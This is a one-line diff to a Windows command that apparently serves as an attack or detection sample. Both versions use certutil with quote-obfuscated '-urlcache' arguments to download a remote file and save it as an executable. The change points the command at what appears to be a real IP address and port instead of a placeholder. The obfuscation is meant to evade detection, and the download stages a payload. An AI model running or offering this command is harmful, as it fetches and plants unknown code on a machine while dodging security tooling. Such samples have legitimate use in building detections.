@@ -1,1 +1,1 @@
-certutil -url""""cache -split -f http://1.1.1.1/exe Z:\\1.exe
+certutil -url""""cache -split -f http://152.42.198.168:7762/new_v.txt Z:\\1.exe
